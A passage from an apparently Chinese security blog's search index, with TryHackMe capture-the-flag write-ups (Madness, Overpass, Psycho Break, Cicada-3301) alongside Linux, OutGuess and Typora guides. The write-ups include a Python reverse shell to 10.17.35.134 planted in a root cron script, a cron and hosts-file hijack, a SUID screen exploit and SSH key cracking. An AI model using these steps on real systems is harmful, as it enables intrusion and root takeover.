重启虚拟机生效sudo reboot\n\n\n新版 Kali KDE 把桌面功能整合在 open-vm-tools 包里，不需要 open-vm-tools-desktop。\n\n--now 参数会同时启用并启动服务。\n\n重启后，你的 复制粘贴、拖拽文件 功能应该可以使用。\n\n\n弄了一整个下午终于解决了开心😄\n","categories":["疑难杂症"],"tags":["故障排查","已解决","问题与复盘","学习问题"]},{"title":"Linux 配置环境常用命令","url":"/2025/09/16/Linux%20%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/","content":"Linux 配置环境常用命令~（持续更新）1.在Linux下创建快捷启动方式拿 Oneforall 为例：一、创建全局启动脚本（推荐方案）\n步骤 1：创建系统级命令文件\nsudo nano /usr/local/bin/oneforall\n\n步骤 2：写入脚本内容（基于 ）\n#!/bin/bash# 激活 OneForAll 的虚拟环境source /opt/OneForAll/venv/bin/activate# 执行 OneForAll 主程序并传递参数python /opt/OneForAll/oneforall.py &quot;$@&quot;# 退出虚拟环境deactivate\n\n步骤 3：赋予执行权限\nsudo chmod +x /usr/local/bin/oneforall\n\n步骤 4：全局验证\ncd /  # 切换到根目录oneforall --help  # 应显示帮助信息oneforall --target baidu.com run  # 测试扫描\n\n2.创建 Python 中用于创建虚拟环境的核心命令1.创建环境\npython -m venv venv       # 基础命令\n\n2.激活环境\nLinux&#x2F;macOS:\nsource venv/bin/activate  # 终端提示符变为 (venv)\n\nWindows:\nvenv\\Scripts\\activate.bat  # 提示符变为 (venv)\n\n3.安装依赖\n(venv) pip install django==4.2  # 包仅安装到当前环境\n\n4.停用环境\n(venv) deactivate          # 返回全局环境\n\n3.安装 virtualenvpip3 install virtualenv\n\n创建虚拟环境\nvirtualenv myenv\n\n\nmyenv 是虚拟环境目录\n可以指定 Python 版本：\n\nvirtualenv -p python3.10 myenv\n\n激活虚拟环境\n\nLinux&#x2F;macOS:\n\nsource myenv/bin/activate\n\n\nWindows (cmd):\n\nmyenv\\Scripts\\activate\n\n退出虚拟环境\ndeactivate\n\n4.proxychains4 的配置文件系统级配置\n/etc/proxychains4.conf\n\n\n修改系统所有用户的 proxychains 行为\n需要 sudo 权限：\n\nsudo nano /etc/proxychains4.conf\n\n用户级配置\n~/.proxychains/proxychains.conf\n\n\n只影响当前用户\n如果没有，可以手动创建：\n\nmkdir -p ~/.proxychainscp /etc/proxychains4.conf ~/.proxychains/proxychains.confnano ~/.proxychains/proxychains.conf","categories":["TryHackMe"],"tags":["渗透测试","Web安全","网络安全","学习笔记"]},{"title":"Madness - TryHackMe","url":"/2025/09/16/Madness%20-%20TryHackMe/","content":"Madness - TryHackMe一、信息收集使用nmap对网站ip端口开放进行探测\nnmap -sS -sV -A  -Pn 10.10.35.188\n\n\n这里开放了一个22端口和80端口访问一下\n\n是个配置目录 使用dirsearch看看还有没有其他隐藏页面\ndirsearch -u http://10.10.35.188/ -e php,html,txt -t 100 \n\n\n这里有个登录页面登录显示NotFound\n\n二、渗透利用无法了先看看首页的源码吧 右键查看源代码\n\n这里有个图片 thm.jpg 访问一下显示图片已经损坏了，我们把他下载下来仔细研究一下\n\n这里就很奇怪，这个文件是jpg结尾但是文件二进制格式确实png\n\n我们把开头改回来\n\n改后\n\n修改完后使用xdg-open 查看告诉我们下面有个隐藏的目录访问看看\n\nhidden directory/th1s_1s_h1dd3n\n\n\n这里说要输入他的秘密，先右键查看源代码这里给了我们一段提示说是介于0~99之间\n\n在url后面添加上&#x2F;?secret&#x3D;1 即可输入秘密\n\n这里先用yakit抓个包爆破一下吧\n\n在第73个这里成功输入他的秘密\ny2RPJ4QaPF!B\n\n三、隐写术我们使用steghide extract -sf thm.jpg  输入我们得到的得到的密码成功提取出一段隐藏的文本\n \n这里使用这个账户和上面那个密码还是无法登录，可能还另藏玄机，我们注意到我们房间首页上面还有一张图片，新建链接，将他下载下来\n\n我这里继续使用steghide提取然后没输入密码就出来了 啊？我还验证了一下， 不管了文件下面出现了我们想要的密码登录看一下\nsteghide extract -sf &#x27;5iW7kC8 - Imgur.jpg&#x27;  *axA&amp;GF8dP\n\n\n这里尝试登录ssh怎么死活都登不上去看了一下wp前面那个用户名是用了ROT13编码后的 真正的用户名是joker 这回真成joker了\n\n换了一个用户名也是成功登录了\n\n四、提权这里我看了 sudo –l 无法使用 计划任务也没有 只能从suid文件入手了\nfind / -perm -4000 -type f 2&gt;/dev/null\n\n\nscreen 存在历史漏洞（CVE-2019-12735）允许本地用户利用 SUID screen 提权到 root\n\ncp /usr/share/exploitdb/exploits/linux/local/41154.sh ~/screen_exp.sh                          ✔ chmod +x ~/tryhackme/screen_exp.sh\n\n再使用nc将这个文件反弹回靶机\nnc 靶机ip 4444 &lt; screen_exp.shnc -lvnp 4444 &gt; exp.sh\n\n本地就会生成一个exp.sh的文件然后运行他\n./exp.sh\n\n接着本地会生成一个rootshell的文件然后在使用这个文件\nrootshell\n\n\n","categories":["TryHackMe"],"tags":["渗透测试","Web安全","网络安全","学习笔记"]},{"title":"OutGuess 安装与问题排查指南（Kali Linux 环境）","url":"/2025/09/16/OutGuess%20%E5%AE%89%E8%A3%85%E4%B8%8E%E9%97%AE%E9%A2%98%E6%8E%92%E6%9F%A5%E6%8C%87%E5%8D%97%EF%BC%88Kali%20Linux%20%E7%8E%AF%E5%A2%83%EF%BC%89/","content":"OutGuess 安装与问题排查指南（Kali Linux 环境）本文档基于实际操作流程，整理了 OutGuess 工具从下载、编译安装到常见问题解决的完整步骤，适用于 CTF 隐写术场景下的工具配置需求。\n一、工具简介OutGuess 是经典隐写术工具，主要用于在 JPEG&#x2F;PPM 图像 中隐藏 &#x2F; 提取数据，支持密码加密，且能修复图像统计特征以降低检测概率，是 CTF 隐写题常用工具之一。\n二、安装前准备1. 依赖工具清单安装 OutGuess 需先配置编译环境和依赖库，核心依赖如下：\n\n\n\n依赖包名\n作用\n安装命令\n\n\n\nbuild-essential\n提供 GCC 编译器、make 等编译工具\nsudo apt install build-essential\n\n\nlibjpeg-dev\nJPEG 图像编码 &#x2F; 解码库（OutGuess 核心依赖）\nsudo apt install libjpeg-dev\n\n\ngit&#x2F;wget\n下载源码（二选一）\nsudo apt install git wget\n\n\n三、完整安装步骤步骤 1：下载 OutGuess 源码推荐两种下载方式，避免 Git TLS 握手问题：\n方式 1：直接下载 ZIP 包（推荐，绕开 Git 代理问题）# 进入下载目录cd ~/下载# 下载源码 ZIP 包wget https://github.com/crorvick/outguess/archive/refs/heads/master.zip# 解压unzip master.zip# 进入源码目录cd outguess-master\n\n方式 2：Git 克隆（需解决代理问题）若需通过代理克隆，可单独设置环境变量：\n# 单独为 Git 设置 SOCKS5 代理（替换为你的代理地址）ALL_PROXY=socks5://192.168.1.105:7890 git clone https://github.com/crorvick/outguess.gitcd outguess\n\n步骤 2：编译源码（关键步骤）情况 1：正常编译（GCC 版本 &lt; 14）# 1. 生成 Makefile（检查环境并配置）./configure# 2. 编译生成可执行文件make# 3. 全局安装（将 outguess 放入 /usr/local/bin）sudo make install\n\n情况 2：GCC 14+ 版本兼容问题（报错 implicit-int）GCC 14 及以上默认启用 C11 标准，对「隐式 int 类型」报错，需指定兼容标准：\n# 1. 清理旧缓存（若之前 configure 失败）rm -f config.cache config.log# 2. 强制用 GNU89 标准编译，解决隐式 int 问题CFLAGS=&quot;-std=gnu89&quot; ./configure# 3. 编译并安装make &amp;&amp; sudo make install\n\n情况 3：绕过 configure 直接编译（备用方案）若 .&#x2F;configure 始终失败，可直接用 GCC 编译所有源码文件：\n# 直接编译所有 .c 文件，链接 JPEG 库和数学库gcc -o outguess outguess.c jpg.c arc.c golay.c fourier.c histogram.c iterator.c pnm.c -ljpeg -lm# 手动全局安装sudo cp outguess /usr/local/bin/sudo chmod +x /usr/local/bin/outguess\n\n步骤 3：验证安装# 检查是否全局可用outguess -h# 若输出帮助信息，说明安装成功\n\n四、常见问题排查问题 1：configure 报错「C compiler cannot create executables」报错日志关键信息configure: error: installation or configuration problem: C compiler cannot create executables.config.log 显示：error: return type defaults to &#x27;int&#x27; [-Wimplicit-int]\n\n原因GCC 14+ 版本默认标准不支持「隐式 int 函数返回类型」，与旧版 configure 脚本不兼容。\n解决参考「步骤 2 - 情况 2」，用 CFLAGS&#x3D;”-std&#x3D;gnu89” 指定编译标准。\n问题 2：Git 克隆时 TLS 握手失败报错信息致命错误：无法访问 &#x27;https://github.com/crorvick/outguess/&#x27;：GnuTLS, handshake failed: TLS 链接非正常地终止了。\n\n原因代理不稳定或 HTTPS 协议兼容性问题。\n解决\n改用 ZIP 包下载（见「步骤 1 - 方式 1」）；\n\n或用 SSH 克隆（需配置 GitHub SSH 密钥）：\n\n\ngit clone git@github.com:crorvick/outguess.git\n\n问题 3：编译时缺少 JPEG 库报错信息undefined reference to &#x27;jpeg_std_error&#x27;\n\n原因未安装 libjpeg-dev 依赖库。\n解决sudo apt install libjpeg-dev\n\n问题 4：命令行提示「zsh: command not found: outguess」原因\n未执行 sudo make install，可执行文件未放入系统 PATH；\n\n手动编译后未将 outguess 复制到 &#x2F;usr&#x2F;local&#x2F;bin。\n\n\n解决# 若手动编译，执行以下命令全局安装sudo cp outguess /usr/local/bin/sudo chmod +x /usr/local/bin/outguess\n\n五、OutGuess 基础使用安装成功后，可直接在任意目录使用以下命令：\n\n\n\n功能\n命令示例\n\n\n\n提取隐藏数据\noutguess -k “密码” -r 隐写图片.jpg 输出文件.txt\n\n\n隐藏数据\noutguess -k “密码” -d 待隐藏文件.txt 原始图片.jpg 隐写图片.jpg\n\n\n查看帮助\noutguess -h\n\n\n六、相关工具推荐（CTF 隐写场景）\n\n\n工具\n用途\n安装命令\n\n\n\nsteghide\nJPG&#x2F;BMP&#x2F;WAV 隐写提取\nsudo apt install steghide\n\n\nbinwalk\n提取文件中隐藏的压缩包 &#x2F; 二进制\nsudo apt install binwalk\n\n\nzsteg\nPNG&#x2F;BMP 的 LSB 隐写检测\nsudo apt install zsteg\n\n\nSonic Visualizer\n音频频谱分析（找隐藏文字 &#x2F; QR）\nsudo apt install sonic-visualiser\n\n\n","categories":["疑难杂症"],"tags":["故障排查","已解决","问题与复盘","学习问题"]},{"title":"Overpass – TryHackMe","url":"/2025/09/16/Overpass%20%E2%80%93%20TryHackMe/","content":"Overpass – TryHackMe一、信息收集\n先使用nmap对靶场的端口进行探测\n\nnmap -sV -A  10.10.97.56\n\n\n\n这里开放了22端口和80端口看看网站上面看了一下没有什么用信息\n\n\n\n这里使用dirsearch再对网站进行目录扫描一下\n\npython3 dirsearch.py -u http://10.10.97.56 -e php,html,txt -t 50 -x 403,401 -o result.txt  \n\n\n\n在这下面发现了还有一个admin目录尝试使用弱口令没有用\n\n\n二、漏洞利用\n翻阅一下这个网站的js，在前端 login.js 里，登录时服务端返回的内容会被直接存到 Cookie：\n\n\nCookies.set(&quot;SessionToken&quot;, statusOrCookie)\n\n如果返回 &quot;Incorrect credentials&quot;，就说明密码错误。\n但只要返回的不是 &quot;Incorrect credentials&quot;，这个值就会被保存成 SessionToken。\n而前端并不会再去校验这个 Cookie 值是否真实存在于服务器。\n\n\n我们使用yakit对这个进行抓包，一定要启动响应劫持否则无法修改返回包Incorrect credentials删除，然后提交数据\n\n\n\n\n成功登录admin页面，里面写了一个James的ssh key\n\n\n三、内网渗透\n将ssh key写入到文件里面\n\n\n\n使用命令尝试登录\n\nssh james@10.10.97.56 -i id_rsa \n\n\n\n这里私钥是加密的，所以还需要先解密，这里使用ssh2john把 SSH 私钥文件（id_rsa）转换成 john 能识别的 hash 格式，因为 id_rsa 是加密的（有 passphrase 密码），john 不能直接用，所以必须先用 ssh2john 转换\n\nssh2john id_rsa &gt; id_rsa.hash\n\n\n用 john 来跑字典破解：\n\njohn --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash\n\n如果这里rockyou.txt文件显示为rockyou.txt.gz使用命令解压一下就好了\nsudo gzip -d /usr/share/wordlists/rockyou.txt.gz\n\n\n\n使用rockyou字典对文件进行爆破\n\njohn --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash \n\n\n\n得到ssh密码为james13，对文件进行登录\n\nPermissions 0664 for &#x27;id_rsa&#x27; are too open.This private key will be ignored.# 如果报错那么使用命令chmod 600 id_rsa# 解决\n\n\n\n查看当前目录下文件拿到user.txt\n\n\n四、提权\n查看todo.txt文件，这里有提到脚本看看有没有定时任务\n\n\n\ncat &#x2F;etc&#x2F;crontab查看一下任务意思是 每分钟 root 都会去 overpass.thm 上下载一个脚本，并直接用 bash 执行，这里我们可以尝试去修改 /etc/hosts 静态解析将该我们我们恶意的ip地址下发恶意脚本，进而获得 root 权限\n\n\n\noverpass.thm 指向 127.0.0.1，它会去 本机请求 /downloads/src/buildscript.sh 并以 root 执行，我们将127.0.0.1修改为我们kali的IP地址然后找一个 root 能够访问且你有写权限的路径在这个路径里创建 downloads/src/buildscript.sh,这样当cron计划任务执行的时候就会执行buildscript.sh文件里面的内容\n\n\n\n我在Downloads下面创建了一个downloads里面是cron要执行的路径地址\n\n\n\n我这里修改了buildsript.sh文件内容，写入了反弹命令\n\n\n\n在~&#x2F;Downloads目录下启动命令python3 -m http.server 80开启http服务\n\n\n\n然后启动另外一个终端开启监听模式\n\n\n\n回到靶机上面下载文件\n\ncurl overpass.thm/downloads/src/buildscript.sh\n\n\n\n每一分钟，cron 会尝试去你的 Kali HTTP 服务下载并执行 buildscript.sh过一会儿kali就监听到了\n\n\n拿到root.txt文件\n","categories":["TryHackMe"],"tags":["渗透测试","Web安全","网络安全","学习笔记"]},{"title":"Psycho Break Writeup  TryHackMe","url":"/2025/09/16/Psycho%20Break%20Writeup%20%20TryHackMe/","content":"Psycho Break| Writeup | TryHackMe一、信息收集\n使用nmap扫描ip开放端口\n\nnmap -sS -sV -A  10.10.150.108\n\n\n\n使用dirsearch扫描网站隐藏目录\n\ndirsearch  -u http://10.10.150.108 -w /usr/share/wordlists/dirb/common.txt -t 50\n\n\n\n访问网站右键查看源代码发现了一个隐藏的页面/sadistRoom 看看里面有什么\n\n\n\n恶灵附身第一关的屠夫，想当被屠夫拿电锯被追的紧迫感到现在还能想起，先不管了，看看钥匙看看\n\n\n\n浏览器给了一个弹窗给我们\n\n532219a04ab7a02b56faafbec1a4c1ea\n\n\n\n点击确定后，我们会进入这个房间如果一段时间没有逃离房间会被显示塞巴斯蒂安死亡，这里点击Go to Locker Room输入上面的钥匙后就能前往更衣室\n\n\n偷偷告诉你，躲在床下引诱那个屠夫过来，在他背后捅他18刀就变成绿色浓液了\n\n\n\n这里提示我们map的access key 是需要对Tizmg_nv_zxxvhh_gl_gsv_nzk_kovzhv解码\n\n\n这个是这串是 Atbash 密码（把字母表反转）解出来是：\nGrant_me_access_to_the_map_please\n\n​\t为什么是 Atbash？\n\n观察到像 gl 这类短词，很可能是 to&#x2F;of&#x2F;is 之类常见短词；\n字母间的关系看上去像字母表对称（A↔Z, B↔Y …），这就是 Atbash 的特征。\n\n\n进入map.php 这输入我们刚刚解码的key\n\n\n\n然后给我们列出来刚刚我们进入的房间列表，前面两个进去过了，现在去第三个房间里面看看有什么\n\n\n\n这里是塞巴斯蒂安的安全屋\n\n\n\n我们查看右键源代码这里提示了一段文字我觉得我正在做一个可怕的噩梦。搜寻我的内心，找到它。….E 不知道什么意思\n\n\n\n然后我翻了一下css文件，在这里我发现了一个加密的base64代码里面写着background 这里应该就是安全屋里面的那些图片了\n\n\n\n下载到本地发现这些图片全是加密过的，我又回去看了一下那个提示的英文，将他丢到了翻译软件里面\n\n\n我觉得我正在做一个可怕的噩梦。搜索我，找到它……\n\n这里告诉我 搜索我，不是搜索内心，原来是提示我们进行目录扫描\n使用dirsearch对这个url进行目录扫描，但是我使用了好几个字典都没有爆破出来字典，看了一下wp结果那个目录的名字叫做keeper，我们接下来去访问一下\n\n\n点击按钮后有来到了一个房间，\n\n\n\n右键查看源代码，说要找到这个得去谷歌上面\n\n\n在谷歌上面找了发现了，输入完成后拿到了key\nSt. Augustine Lighthouse\n\n\n48ee41458eb0b43bf82b986cecf3af01\n\n\n再次回到map.php进入废弃的房间\n\n\n\n告诉我们输入守门人的key，点击Go Futher\n\n\n\n到了一个房间，右键查看源代码\n\n\n\n提示我们页面上面有个叫shell的东西能帮我离开这里\n\n\n\n很显然是个命令执行\n\n\n\n这里本来想反弹shell的但是命令给禁止了，通过ls ..我们看到了上机目录 然后里面给了类似路径的东西\n\n\n\n将路径名替换看看\n\n\n\n有一个文件和zip包\n\n二、帮帮我查看了那个文本文件里面没什么东西，重点看看那个zip包 下载到本地 解压\n\n\n看一下文件大致意思是\n\n\n来自 Joseph 的信息：\n\n谁看到这个消息 &quot;HELP Me&quot; 的人，请注意。Ruvik 把我关在这个房间里。钥匙在桌子上，用它把我关的房间打开。我出来之后会告诉你发生了什么。\n\n\n桌子上的钥匙，刚好解压出来有个table.jpg图片，我们使用binwakl对图片进行查看\n\n\n这图片里面还有一个图片和一个key，将图片重名，解压拿到里面的东西\n\n\n这个音频是个摩斯密码https://morsecode.world/international/decoder/audio-decoder-adaptive.html\n解答出来是 SHOWME \n\n\n使用命令提取图片里面的信息\n\nsteghide extract -sf Joseph_Oda.jpg -p SHOWME \n\n\n\n里面有ftp的账号密码\n\nSER : joseph                           PASSWORD : intotheterror445  \n\n\n\n\n三、把他打开使用ftp连接 下载里面的文件\n\n给这个program程序添加执行权限然后运行，提示我们要输入单词 在随便输入了一个单词后 失败 这里应该是要输入特定的单词 我们看看另外一个文件\n\n这个random.dic想一个字典文件\n\n在网上找了一个python脚本运行此文件\ncat &gt; hack.py &lt;&lt;&#x27;PY&#x27;#!/usr/bin/env python3import subprocessimport sysimport osif not os.path.exists(&quot;random.dic&quot;):    print(&quot;random.dic not found&quot;, file=sys.stderr)    sys.exit(1)with open(&quot;random.dic&quot;, &quot;r&quot;, encoding=&quot;utf-8&quot;, errors=&quot;ignore&quot;) as f:    for line in f:        key = line.rstrip(&quot;\\r\\n&quot;)        if not key:            continue        print(key)        subprocess.run([&quot;./program&quot;, key])PYchmod +x hack.pypython3 ./hack.py\n\n\n没看懂这个解码后的密码·是什么拿去ai问了一下说是手机多次按键（multi-tap &#x2F; T9 的按键输入） 编码。把每组相同数字按键映射回字母后 是我过时了\n\nKIDMAN’S PASSWORD IS SO STRANGE\n（也可以写成无标点的 KIDMANSPASSWORDISSOSTRANGE）\n\n这个大写的因为字母说 kidman的密码太奇怪了 尝试登录一下ssh 用kidman做用户名用KIDMANSPASSWORDISSOSTRANGE作为密码\n\n成功登录\n\n四、前往捕获旗帜尝试sudo -l 报错不允许以 sudo 运行任何命令 看看计划任务有什么\n\n在这里我们可以看到有一个 Python 脚本正在运行，该脚本存储在 /var/.the_eye_of_ruvik.py。我们可以检查是否可以编辑此文件，如果可以，我们可以修改它并为我们所用\n\n我们在脚本里面添加上我们的反弹shell的命令\nimport socket,subprocess,oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((&quot;10.17.35.134&quot;,4444));os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;])\n\n然后新建终端监听4444端口即可拿到shell\n\n奖励任务是删除用户 ruvik\n\n","categories":["TryHackMe"],"tags":["渗透测试","Web安全","网络安全","学习笔记"]},{"title":"TryHackMe  Cicada-3301 Vol1","url":"/2025/09/16/TryHackMe%20%20Cicada-3301%20Vol1/","content":"TryHackMe | Cicada-3301 Vol:1一、分析音频软件先把文件下载到本地使用unzip解压缩，得到一个音频文件和一个图片\n\n\n我们这边先查看一下图片里面是什么内容\n\n\n大致意思：你好。我们正在寻找高智商的人。为了找到他们，我们设计了一个测试。\n这张图片里藏有一条信息。找到它，它会指引你踏上寻找我们的道路。我们期待着见到那些能一路坚持到底的少数人。\n祝你好运\n\n\n\n这个图片里面藏着有一条信息，我们这里先分析音频根据页面的提示使用 Sonic Visualizer 分析音频\n\n\nSonic Visualiser（中文一般叫「声波可视化工具」）是一个专门用来 可视化和分析音频文件 的开源软件。\n它和普通的音乐播放器（比如 VLC、mpv）不同，重点在于「看」而不是「听」：\n\n# 安装方法sudo apt updatesudo apt install sonic-visualiser# 运行sonic-visualiser filename.wav\n\n\n\n\n\n使用命令查看文件后然后在菜单 Pane → Add Spectrogram 就能看到频谱图，出来是一个二维码？\n\n\n\n我拿手机扫🐎了一下，跳出一个网站这里告诉我们字段和key了\nhttps://pastebin.com/wphPq0Aa\n\n\n二、解密密码Passphrase: SG01Ul80X1A0NTVtaHA0NTMhKey: Q2ljYWRh\n\n\n这里好像是两个base64编码，先拿去解密一下\n\n\nHm5R_4_P455mhp453!Cicada\n\n\n这里我试了两个密码以旧无法解密图片，看了一下提示，提了了我们说法国外交官密码，去bing上面搜了一下原来是维吉尼亚密码（Vigenère cipher）\n\n\n\n拿到厨子上面进行编码一下得到加密后的密码Ju5T_4_P455phr453!\n\n\n\n得到一个文件看看里面有什么\n\n\n三、收集元数据\n这里给了我们一个url，https://imgur.com/a/c0ZSZga访问看看https://imgur.com/a/c0ZSZga#8S8OaQw\n\n\n\n看了一下感觉没有其他的图片了这里估计是让我们将这个图片下载下来分析\n\n\n四、查找隐藏文件\n下载到本地我使用steghide和binwalk都没有看了一下wp这里要用Outguess工具对这个图片信息进行查看\n\n\nOutGuess 是一个经典的隐写术（Steganography）工具，主要用于将信息隐藏在 JPEG 图像或 PPM&#x2F;PNM 图像 文件中，同时尽量不改变图像的统计特征，让隐藏的数据更难被检测出来。\n\n现在使用outguess查看我们这个网站下载的图片\noutguess -r &#x27;undefined - Imgur.jpg&#x27; 1.txt \n\n\n五、查找数据密码Here is a book code. To find the book, break this hash:b6a233fb9b2d8772b636ab581169b58c98bd4b8df25e452911ef75561df649edc8852846e81837136840f3aa453e83d86323082d5b6002a16bc20c1560828348\n\n\nbreak this hash” 意思是 找到一本书或者文本，验证 SHA1&#x2F;SHA256 哈希匹配\n你需要找到原文或电子书作为“密钥文本”（book text）\n\nUse positive integers to go forward in the text use negative integers to go backwards in the text.I:1:6I:2:15...\n\nI:x:y 类似指向文本的 行号&#x2F;单词&#x2F;字符索引\n正整数 → 从开头向前数\n负整数 → 从结尾向后数\n用这些索引去提取 书中对应字符，组合起来就是谜题答案\n这里先把hash值,丢进网址分析一下这段hash是什么类型的\n\nhttps://hashes.com/en/tools/hash_identifier\n\n\n看起来像是SHA512 拿去这个网址解码一下 https://md5hashing.net \n\n得到了一个urlhttps://pastebin.com/6FNiVLh5,访问看看里面有什么\n\n看来这就是我们所要的book了，将他下载下来，在使用命令将提示里面的索引值提取出来最后会给一个短链接\nhttps://bit.ly/39pw2NH\n\n当它完全解析后，它会返回一个缩短的 URL，将我们重定向到 SoundCloud。\nhttps://soundcloud.com/user-984804993/the-instar-emergence\n\n\n是个音乐网站歌名是：The Instar Emergence\n听说这个解码背后涉及到了一个挺有意思的故事有兴趣的可以搜索一下\n","categories":["TryHackMe"],"tags":["渗透测试","Web安全","网络安全","学习笔记"]},{"title":"TryHackMe BruteIt writeup","url":"/2025/09/16/TryHackMe%20BruteIt%20writeup/","content":"TryHackMe BruteIt writeup一、信息收集\n使用nmap对ip地址开放的端口进行探测\n\nnmap -sS -sV -A  10.10.44.150\n\n\n","categories":["TryHackMe"],"tags":["渗透测试","Web安全","网络安全","学习笔记"]},{"title":"应急响应常用命令","url":"/2025/09/18/Typora%20Markdown%20%E7%BC%96%E8%BE%91%E5%BF%AB%E6%8D%B7%E9%94%AE%E5%A4%A7%E5%85%A8%EF%BC%88%E4%BC%98%E5%8C%96%E8%A1%A5%E5%85%85%E7%89%88%EF%BC%89/","content":"Typora Markdown 编辑快捷键大全（优化补充版）说明本文档基于历史对话内容整理，补充了使用场景说明、操作细节及实用技巧，覆盖 Typora 中 Markdown 编辑的核心快捷键（Windows&#x2F;Linux 与 Mac 版本对应），适用于日常文档编辑、笔记整理等场景，可直接保存为 Markdown 文件或打印使用。\n一、文本格式快捷键\n\n\n功能\nWindows&#x2F;Linux\nMac\nMarkdown 语法\n补充说明\n\n\n\n加粗\nCtrl + B\n⌘ + B\n加粗内容\n选中文本后使用，直接为文本添加加粗格式\n\n\n斜体\nCtrl + I\n⌘ + I\n斜体内容\n选中文本后使用，支持嵌套（如 粗斜体）\n\n\n下划线\nCtrl + U\n⌘ + U\n下划线内容\n部分 Markdown 解析器需开启扩展支持\n\n\n删除线\nAlt + Shift + 5\n⌘ + Shift + 5\n删除线内容\n选中文本后使用，常用于标记作废内容\n\n\n行内代码\nCtrl + Shift + &#96;&#96;\n⌘ + Shift + &#96;&#96;\n行内代码\n选中文本后使用，自动包裹代码，避免语法冲突\n\n\n插入超链接\nCtrl + K\n⌘ + K\n链接文本\n可直接粘贴 URL，支持本地文件路径（.&#x2F;xxx.md）\n\n\n插入图片\nCtrl + Shift + I\n⌘ + Shift + I\n\n支持拖拽图片自动生成路径，alt 文本用于加载失败提示\n\n\n自动补全符号\nTab\nTab\n-\n输入 (&#x2F;[&#x2F;{ 后按 Tab，自动补全闭合符号 )&#x2F;]&#x2F;}\n\n\n二、标题与段落快捷键\n\n\n功能\nWindows&#x2F;Linux\nMac\nMarkdown 语法\n补充说明\n\n\n\n一级标题\nCtrl + 1\n⌘ + 1\n# 一级标题\n光标在段落内即可使用，无需全选\n\n\n二级标题\nCtrl + 2\n⌘ + 2\n## 二级标题\n按快捷键后可直接输入标题内容\n\n\n三级标题\nCtrl + 3\n⌘ + 3\n### 三级标题\n-\n\n\n四级标题\nCtrl + 4\n⌘ + 4\n#### 四级标题\n-\n\n\n五级标题\nCtrl + 5\n⌘ + 5\n##### 五级标题\n-\n\n\n六级标题\nCtrl + 6\n⌘ + 6\n###### 六级标题\n最低级标题，常用于小节标注\n\n\n转为正文\nCtrl + 0\n⌘ + 0\n普通文本\n取消标题格式，恢复为正文段落\n\n\n块引用\nCtrl + Shift + Q\n⌘ + Shift + Q\n&gt; 引用内容\n多次使用可嵌套（如 &gt;&gt; 二级引用）\n\n\n段落左对齐\nCtrl + Shift + L\n⌘ + Shift + L\n-\n默认对齐方式，适用于大部分文本\n\n\n段落居中\nCtrl + Shift + C\n⌘ + Shift + C\n-\n常用于标题、图片等元素的居中展示\n\n\n段落右对齐\nCtrl + Shift + R\n⌘ + Shift + R\n-\n较少用，适用于特殊格式需求（如落款）\n\n\n段落两端对齐\nCtrl + Shift + J\n⌘ + Shift + J\n-\n适用于长文本段落，优化排版美观度\n\n\n水平分割线\nCtrl + Shift + -\n⌘ + Shift + -\n— 或 ***\n需单独占一行，避免与上下文本粘连\n\n\n三、列表与任务快捷键\n\n\n功能\nWindows&#x2F;Linux\nMac\nMarkdown 语法\n补充说明\n\n\n\n无序列表\nCtrl + Shift + L\n⌘ + Shift + L\n- 列表项 或 * 列表项\n按快捷键后输入内容，回车自动生成下一项\n\n\n有序列表\nCtrl + Shift + O\n⌘ + Shift + O\n1. 列表项\n自动递增序号，删除中间项后序号会自动重排\n\n\n任务列表（待办）\n手动触发\n手动触发\n- [ ] 待办任务\n输入 - [ ] （注意空格）后按空格触发，无需快捷键\n\n\n任务列表（完成）\n手动触发\n手动触发\n- [x] 完成任务\n将 [ ] 改为 [x]（x 不区分大小写）\n\n\n列表层级缩进\nTab\nTab\n-\n增加列表嵌套层级（如子列表）\n\n\n减少列表缩进\nShift + Tab\nShift + Tab\n-\n减少嵌套层级，回到上一级列表\n\n\n四、代码与数学公式快捷键\n\n\n功能\nWindows&#x2F;Linux\nMac\nMarkdown 语法\n补充说明\n\n\n\n行内代码\nCtrl + Shift + &#96;&#96;\n⌘ + Shift + &#96;&#96;\n代码片段\n适用于单行代码（如 print(“hello”)）\n\n\n代码块\nCtrl + Shift + K\n⌘ + Option + C\n语言代码块\n生成后可在开头指定语言（如 python）开启语法高亮\n\n\n行内数学公式\nCtrl + Shift + M\n⌘ + Option + M\n$ 公式内容 $\n适用于短公式（如 $a^2 + b^2 &#x3D; c^2$）\n\n\n数学公式块\nCtrl + Shift + M\n⌘ + Option + B\n$$ 公式内容 $$\n单独占一行，支持复杂公式（如矩阵、积分）\n\n\n五、表格操作快捷键\n\n\n功能\nWindows&#x2F;Linux\nMac\nMarkdown 语法\n补充说明\n\n\n\n插入表格\nCtrl + T\n⌘ + T\n&#96;\n列 1\n\n\n表格添加行\nAlt + Shift + ↓\n⌥ + Shift + ↓\n-\n光标在目标行任意位置，按快捷键添加下方行\n\n\n表格删除行\nAlt + Shift + ↑\n⌥ + Shift + ↑\n-\n光标在目标行，按快捷键删除当前行\n\n\n表格移动行\nAlt + ↑ &#x2F; Alt + ↓\n⌥ + ↑ &#x2F; ⌥ + ↓\n-\n上下移动当前行，保持表格结构不变\n\n\n表格合并单元格\n手动操作\n手动操作\n-\n选中多个单元格，右键选择 “合并单元格”\n\n\n六、视图与模式快捷键\n\n\n功能\nWindows&#x2F;Linux\nMac\n补充说明\n\n\n\n专注模式\nF8\nF8\n仅高亮当前段落，隐藏其他内容，适合专注写作\n\n\n打字机模式\nF9\nF9\n光标始终保持在屏幕中间，减少视线移动\n\n\n源代码模式\nCtrl + &#x2F;\n⌘ + &#x2F;\n切换为纯 Markdown 语法视图，可手动修改代码\n\n\n大纲面板\nCtrl + Shift + 1\n⌘ + Shift + 1\n显示文档标题结构，支持点击跳转\n\n\n全屏模式\nF11\n⌃ + ⌘ + F\n隐藏窗口边框，最大化编辑区域\n\n\n预览模式\nCtrl + Shift + P\n⌘ + Shift + P\n部分版本支持，仅展示渲染后的效果（非实时）\n\n\n七、文档与窗口快捷键\n\n\n功能\nWindows&#x2F;Linux\nMac\n补充说明\n\n\n\n新建文档\nCtrl + N\n⌘ + N\n新建空白 Markdown 文档\n\n\n打开文档\nCtrl + 